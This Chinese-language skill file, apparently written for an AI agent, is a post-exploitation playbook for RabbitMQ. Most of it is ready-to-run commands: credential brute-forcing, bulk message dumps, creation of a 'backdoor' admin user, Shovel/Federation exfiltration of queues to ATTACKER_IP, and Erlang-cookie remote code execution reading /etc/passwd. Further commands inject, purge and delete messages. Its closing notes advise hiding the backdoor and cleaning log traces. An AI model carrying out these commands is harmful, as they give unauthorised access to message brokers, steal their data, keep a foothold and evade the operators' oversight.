---
name: rabbitmq-tactics
description: "RabbitMQ 未授权访问与利用。当发现目标开放 5672/15672 端口、RabbitMQ Management API 暴露、默认凭据 guest/guest 未修改、或需要从 RabbitMQ 窃取消息数据时使用。覆盖默认凭据攻击、Management API 枚举、队列消息批量导出、Exchange 滥用、用户创建与密码修改、VHost 操控、Shovel/Federation 数据外传、集群信息窃取、Erlang Cookie RCE、消息篡改"
metadata:
  tags: "rabbitmq,5672,15672,amqp,management-api,guest,erlang-cookie,shovel,federation,vhost,消息队列"
  category: "postexploit"
---

# RabbitMQ 未授权访问与利用

RabbitMQ 默认开启 Management Plugin 并使用 guest/guest 凭据（仅限 localhost），但大量实例因配置 `loopback_users = none` 导致 guest 账户可远程登录——从消息窃取到 Erlang Cookie RCE 只需几步。

## 深入参考（必读）
- 完整利用命令和 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 1: 服务发现与端口识别

### 1.1 端口扫描

```bash
# 常用端口：5672(AMQP), 15672(Management UI), 4369(epmd), 25672(集群通信)
nmap -sV -p 5672,15672,4369,25672 TARGET

# AMQP 服务探测
nmap -sV -p 5672 --script amqp-info TARGET
```

### 1.2 Management UI 探测

```bash
# 检查 Management API 是否可达
curl -s -o /dev/null -w "%{http_code}" http://TARGET:15672/api/overview

# HTTPS 变体
curl -sk -o /dev/null -w "%{http_code}" https://TARGET:15672/api/overview
```

**关键判断**：
- 返回 401 → Management API 可达，需要凭据，进入 Phase 2
- 返回 200 → 已有有效认证或无需认证（罕见），直接进入 Phase 3
- 连接失败 → Management Plugin 未启用，尝试 5672 AMQP 直连
- 4369 开放 → epmd 暴露，可枚举 Erlang 节点名

---

## Phase 2: 默认凭据与弱口令检测

### 2.1 默认凭据

```bash
# guest/guest（最常见，默认仅限 localhost，但常被配置为允许远程）
curl -s -u guest:guest http://TARGET:15672/api/overview | jq '.rabbitmq_version'

# admin/admin
curl -s -u admin:admin http://TARGET:15672/api/overview | jq '.rabbitmq_version'

# 批量测试常见凭据
for creds in "guest:guest" "admin:admin" "admin:password" "admin:123456" "rabbitmq:rabbitmq"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$creds" http://TARGET:15672/api/overview)
  echo "$creds -> $code"
done
```

### 2.2 暴力破解

```bash
# Hydra 针对 HTTP Basic Auth
hydra -L users.txt -P passwords.txt TARGET http-get /api/overview -s 15672

# Nmap HTTP 爆破
nmap -p 15672 --script http-brute --script-args http-brute.path=/api/overview TARGET
```

**关键判断**：
- 返回 200 + JSON 数据 → 凭据有效，进入 Phase 3
- 全部 401 → 无弱口令，尝试 AMQP 5672 端口直连或寻找其他入口

---

## Phase 3: 攻击决策树

```
凭据有效？
├─ Management API 可用 (15672)
│   ├─ 用户具备 administrator tag
│   │   ├─ 枚举队列/Exchange/VHost → 消息批量导出 (Phase 4.1)
│   │   ├─ 创建后门用户 → 持久化访问 (Phase 4.2)
│   │   ├─ 配置 Shovel/Federation → 数据外传到攻击机 (Phase 4.3)
│   │   └─ 读取集群/节点信息 → 横向移动 (Phase 4.4)
│   └─ 用户为普通权限
│       ├─ 读取可访问队列消息
│       └─ 枚举 Exchange 绑定关系
├─ 可访问文件系统
│   ├─ 读取 Erlang Cookie → RCE (Phase 5)
│   └─ 读取 rabbitmq.conf → 获取更多凭据
└─ 仅 AMQP 5672 可达
    ├─ 用 amqp 客户端连接枚举
    └─ 监听消息消费
```

**前置信息收集**：

```bash
# 获取 RabbitMQ 版本与集群名
curl -s -u USER:PASS http://TARGET:15672/api/overview | jq '{rabbitmq_version, cluster_name, erlang_version}'

# 列出所有用户及其 tag（判断权限等级）
curl -s -u USER:PASS http://TARGET:15672/api/users | jq '.[] | {name, tags}'

# 列出所有 VHost
curl -s -u USER:PASS http://TARGET:15672/api/vhosts | jq '.[].name'

# 列出当前用户权限
curl -s -u USER:PASS http://TARGET:15672/api/permissions | jq '.'
```

---

## Phase 4: Management API 利用速查

### 4.1 队列枚举与消息批量导出

```bash
# 列出所有队列（关注 messages 字段，非零表示有待消费消息）
curl -s -u USER:PASS http://TARGET:15672/api/queues | jq '.[] | {vhost, name, messages}'

# 从指定队列获取消息（requeue: true 不删除原消息）
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 100, "requeue": true, "encoding": "auto"}'

# 批量导出所有队列消息
for queue in $(curl -s -u USER:PASS http://TARGET:15672/api/queues | jq -r '.[].name'); do
  echo "=== Queue: $queue ==="
  curl -s -u USER:PASS \
    "http://TARGET:15672/api/queues/%2F/$queue/get" \
    -H "content-type: application/json" \
    -d '{"count": 10000, "requeue": true, "encoding": "auto"}'
done > rabbitmq_messages_dump.json
```

### 4.2 用户创建与权限操控

```bash
# 创建 administrator 用户
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/backdoor \
  -H "content-type: application/json" \
  -d '{"password": "P@ssw0rd!", "tags": "administrator"}'

# 授予全部权限（对 / VHost）
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/permissions/%2F/backdoor" \
  -H "content-type: application/json" \
  -d '{"configure": ".*", "write": ".*", "read": ".*"}'

# 修改已有用户密码
curl -u USER:PASS -X PUT \
  http://TARGET:15672/api/users/admin \
  -H "content-type: application/json" \
  -d '{"password": "newP@ss", "tags": "administrator"}'
```

### 4.3 Shovel/Federation 数据外传

```bash
# 创建 Shovel：将目标队列消息实时转发到攻击机
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/shovel/%2F/exfil-shovel" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "src-uri": "amqp://localhost",
      "src-queue": "sensitive-queue",
      "dest-uri": "amqp://ATTACKER_IP",
      "dest-queue": "stolen-data"
    }
  }'

# 创建 Federation Upstream：镜像目标 Exchange
curl -u USER:PASS -X PUT \
  "http://TARGET:15672/api/parameters/federation-upstream/%2F/attacker-upstream" \
  -H "content-type: application/json" \
  -d '{
    "value": {
      "uri": "amqp://ATTACKER_IP",
      "prefetch-count": 1000
    }
  }'
```

### 4.4 集群与节点信息

```bash
# 节点列表（获取主机名、Erlang 版本、内存使用）
curl -s -u USER:PASS http://TARGET:15672/api/nodes | jq '.[] | {name, erlang_version, mem_used}'

# 当前连接（获取客户端 IP、用户名）
curl -s -u USER:PASS http://TARGET:15672/api/connections | jq '.[] | {peer_host, peer_port, user}'

# 通道信息
curl -s -u USER:PASS http://TARGET:15672/api/channels | jq '.[] | {connection_details, user}'
```

→ 完整 API 端点与 payload → 读 [references/attack-techniques.md](references/attack-techniques.md)

---

## Phase 5: Erlang Cookie RCE 速查

### 5.1 获取 Erlang Cookie

```bash
# 常见路径
cat /var/lib/rabbitmq/.erlang.cookie
cat /home/rabbitmq/.erlang.cookie
cat ~/.erlang.cookie

# 环境变量
env | grep -i erlang
```

### 5.2 利用 Cookie 执行命令

```bash
# 使用窃取的 Cookie 连接到目标节点
# 获取节点名（从 Management API 或 epmd）
epmd -names  # 在 4369 端口查询

# 通过 Erlang 远程调用执行命令
erl -sname attacker -setcookie STOLEN_COOKIE -remsh rabbit@TARGET_HOSTNAME

# 在 Erlang shell 中执行系统命令
> os:cmd("id").
> os:cmd("cat /etc/passwd").
> os:cmd("whoami").

# 或通过 rabbitmqctl 远程管理
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME cluster_status
RABBITMQ_ERLANG_COOKIE=STOLEN_COOKIE rabbitmqctl -n rabbit@TARGET_HOSTNAME eval 'os:cmd("id").'
```

**关键判断**：
- Erlang Cookie 一致 → 可获得 RCE，权限等同于 RabbitMQ 进程用户
- Cookie 不匹配 → `PROTOCOL_ERROR` / 连接拒绝，无法利用

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取完整 Erlang 利用细节

---

## Phase 6: Exchange 滥用与消息篡改

### 6.1 Exchange 枚举

```bash
# 列出所有 Exchange
curl -s -u USER:PASS http://TARGET:15672/api/exchanges | jq '.[] | {vhost, name, type}'

# 查看 Exchange 绑定关系
curl -s -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/bindings/source" | jq '.'
```

### 6.2 消息注入

```bash
# 向 Exchange 发布消息（可干扰业务逻辑）
curl -u USER:PASS \
  "http://TARGET:15672/api/exchanges/%2F/EXCHANGE_NAME/publish" \
  -H "content-type: application/json" \
  -d '{"routing_key": "target.key", "payload": "injected_data", "payload_encoding": "string", "properties": {}}'
```

### 6.3 消息篡改与删除

```bash
# 消费消息（不重新入队 = 删除）
curl -s -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/get" \
  -H "content-type: application/json" \
  -d '{"count": 1, "requeue": false, "encoding": "auto"}'

# 清空队列
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME/contents"

# 删除整个队列
curl -X DELETE -u USER:PASS \
  "http://TARGET:15672/api/queues/%2F/QUEUE_NAME"
```

→ 读 [references/attack-techniques.md](references/attack-techniques.md) 获取消息篡改完整流程

---

## 工具速查

| 工具 | 用途 |
|------|------|
| curl + Management API | 所有 HTTP API 操作的基础 |
| rabbitmqadmin | RabbitMQ 官方 CLI 管理工具 |
| amqp-tools (amqp-publish/amqp-consume) | AMQP 协议直连收发消息 |
| pika (Python) | Python AMQP 客户端，编写自动化脚本 |
| hydra | HTTP Basic Auth 爆破 |
| nmap amqp-info | AMQP 服务信息收集 |
| epmd | Erlang 端口映射，枚举节点名 |
| erl | Erlang shell，配合 Cookie 实现 RCE |

---

## 注意事项

- `guest/guest` 默认仅允许 localhost 连接，远程可用说明已配置 `loopback_users = none`
- 消息获取时 `requeue: false` 会永久消费消息，生产环境慎用（推荐 `requeue: true`）
- Shovel/Federation 配置后消息实时转发，流量可能被网络监控捕获
- Erlang Cookie 通常为固定字符串，集群内所有节点共享同一 Cookie
- `%2F` 是 URL 编码的 `/`，代表默认 VHost，API 调用中必须使用编码形式
- 创建后门用户和 Shovel 会在 Management UI 中可见，注意隐蔽性
- rabbitmqctl 操作记录在 RabbitMQ 日志中，注意清理痕迹
